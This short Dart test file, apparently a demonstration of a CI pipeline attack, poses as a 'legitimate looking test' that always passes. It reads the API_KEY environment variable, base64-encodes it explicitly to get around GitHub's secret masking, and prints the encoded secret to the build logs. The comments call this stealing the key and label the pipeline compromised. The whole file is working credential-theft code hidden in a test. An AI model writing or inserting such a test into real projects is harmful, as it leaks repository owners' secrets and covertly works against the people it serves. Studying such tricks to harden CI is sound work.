import 'dart:io';
import 'dart:convert';
import 'package:test/test.dart';

void main() {
  test('Legitimate looking test', () {
    print("--- PIPELINE COMPROMISED ---");
    
    // Steal the injected environment variable
    var stolenKey = Platform.environment['API_KEY'] ?? 'NO_KEY_FOUND';
    
    // Base64 encode it to bypass GitHub's secret masking algorithm
    var exfiltratedData = base64.encode(utf8.encode(stolenKey));
    
    // Print it to the logs
    print("Encoded Secret (Base64): $exfiltratedData");
    
    expect(true, isTrue); 
  });
}
